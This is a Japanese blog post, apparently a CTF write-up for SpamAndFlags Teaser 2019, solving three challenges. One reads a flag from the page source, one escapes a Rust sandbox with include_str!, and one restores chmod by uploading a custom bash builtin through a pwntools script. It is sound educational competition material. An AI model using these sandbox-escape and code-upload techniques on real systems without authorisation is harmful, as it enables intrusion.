---
layout: post
title: SpamAndFlags Teaser 2019 の write-up
categories: [ctf]
date: 2019-04-09 22:05:00 +0900
---

4 月 7 日から 4 月 8 日にかけて開催された [SpamAndFlags Teaser 2019](https://spamandhex.com/ctf/) に、チーム Harekaze として参加しました。最終的にチームで 637 点を獲得し、順位は得点 176 チーム中 12 位でした。うち、私は 3 問を解いて 637 点を入れました。

以下、私が解いた問題の write-up です。

## null
### Sanity Check (10)
> A flag is hidden for you right on this page!

スコアボードのソースを見るとフラグが得られました。

```html
︙
<head>
    <meta charset="utf-8" />
    <title>SpamAndFlags</title>
    <link rel="stylesheet" href="app.min.css" type="text/css" />
    <script src='https://www.google.com/recaptcha/api.js?render=6LdJP4kUAAAAAKlB51UiqmQvVdRA72JGFBhYvO9v' data-recaptcha-script async defer></script>
    <script src="scripts/fetchhelper.js" type="text/javascript"></script>
    <script src="moment/moment.js" type="text/javascript"></script>
    <script src="app.js" type="text/javascript"></script>
    <!-- SaF{DontComplainThatFlagSubmissionDoesntWork} -->
</head>
︙
```

```
SaF{DontComplainThatFlagSubmissionDoesntWork}
```

## pwn
### Rust Jail (294)
> If you don't believe Rust is a perfectly safe language:
> nc 35.195.157.187 1337

`35.195.157.187:1337` に接続してみます。

```
$ nc 35.195.157.187 1337
Solve PoW with: hashcash -mqb26 sbndlgnc
1:26:190407:sbndlgnc::9b35BPX6eWycpsQ0:00000000E8gX5
Rust is safe, you cannot dereference raw pointers safely. Or can you?
We will compile and run the following code with your snippet like this:
rustc -o {output} {input}
Rust is at version 1.33.0 (stable) and it's running on Ubuntu 18.04 (amd64).
There are some additional protections in place to make it not trivial:
some syscalls are forbidden (clone, ...), there is no procfs and you will
not find the source code or the binary.
Please submit your code snippet and then a line containing "EOF".

#![forbid(unsafe_code)]
fn main() {
    // We remove our own binary before running your code
    std::fs::remove_file("/tmp/x").unwrap();

    #[allow(unused_variables)]
    let flag: *const str = "SaF{The real flag will be here}";

    // Your code snippet will be inserted here
}
```

PoW を解くと問題文が出てきました。`unsafe` が許されない状況で `flag` の読み出しができればよいようです。

Rust では [`file!` マクロ](https://doc.rust-lang.org/std/macro.file.html)を使うと、このマクロが呼ばれたファイルのパスを得られます。`println!("{}", file!());` でソースコードのパスを確認しましょう。

```
︙
Compiling...
Running...
/tmp/x.rs
```

`/tmp/x.rs` のようです。Rust では [`include_str!` マクロ](https://doc.rust-lang.org/std/macro.include_str.html)を使うと、これに引数として与えたファイルの内容を文字列として置き換えます。`println!("{}", include_str!("/tmp/x.rs"));` でフラグの含まれているソースコードが得られないでしょうか。

```
︙
Compiling...
Running...
#![forbid(unsafe_code)]
fn main() {
    // We remove our own binary before running your code
    std::fs::remove_file("/tmp/x").unwrap();

    #[allow(unused_variables)]
    let flag: *const str = "SaF{What?_The_compiler_proved_the_code_is_safe...}
";

println!("{}", include_str!("/tmp/x.rs"));
```

フラグが得られました。

```
SaF{What?_The_compiler_proved_the_code_is_safe...}
```

## misc
### Rescue shell (333)
> We have accidentally `rm -rf /`-d the whole machine, but fortunately the most important data file was chmod 000, so it was not deleted*. We also did not restart the machine, so all you have is what's in memory. Can you get the file back? 
> * Yeah, we know it does not work that way 
> nc 34.76.252.188 1337

`34.76.252.188:1337` に接続してみます。

```
$ nc 34.76.252.188 1337
Connecting...
Oh no, everything was deleted, except for /flag!
You only have 10 minutes until the system powers off.
What to do now?
(This shell isn't even interactive, but here's a prompt for you I guess)
root@OH-NO:/# ls
/bin/bash: line 1: ls: command not found
echo *
flag proc
```

当然ながら `ls` も消えてしまっているようです。`echo *` でなんとかカレントディレクトリのファイルの一覧を取得することができました。`echo $(<flag)` で `flag` の表示を試みます。

```
echo $(<flag)
/bin/bash: line 6: flag: Permission denied
```

`Permission denied` と言われてしまいました。`chmod` 等を復活させて `flag` に読み取り権限を付与することができないでしょうか。

いろいろググっていると [rm -rf remains](http://lambdaops.com/rm-rf-remains/) という記事が見つかりました。この記事を参考に `flag` の読み取りを目指してやっていきましょう。

```c
// gcc -Wall -Wextra -pedantic -nostdlib -Os -fpic -shared setx.c -o setx
extern int chmod(const char *pathname, unsigned int mode);

int entry(void) {
        return !! chmod("flag", 0777);
}
char *desc[] = {0};

struct quick_hack {
        char *name; int (*fn)(void); int on;
        char **long_doc, *short_doc, *other;
} setx_struct = { "setx", entry, 1, desc, "chmod 0777 flag", 0 };
```

`gcc -Wall -Wextra -pedantic -nostdlib -Os -fpic -shared setx.c -o setx` でコンパイルします。これを `echo -en "\x7f…" > setx` のように `echo -e` を利用してアップロードし、さらに `setx` の実行をするスクリプトを書きます。

```python
import re
from pwn import *

s = remote('34.76.252.188', 1337)
s.recvuntil('root@OH-NO:/# ')

with open('./setx', 'rb') as f:
  binary = f.read().encode('hex')
binary = '\\x' + '\\x'.join(re.findall(r'.{2}', binary))
command = 'echo -en "' + binary + '" > setx'
s.sendline(command)
s.sendline('enable -f ./setx setx')
s.sendline('setx')

s.interactive()
```

実行します。

```
$ python s.py
[+] Opening connection to 34.76.252.188 on port 1337: Done
[*] Switching to interactive mode
$ echo *
flag proc setx
$ echo $(<flag)
SaF{not_important_if_no_backup_amirite}
$
[*] Interrupted
[*] Closed connection to 34.76.252.188 port 1337
```

フラグが得られました。

```
SaF{not_important_if_no_backup_amirite}
```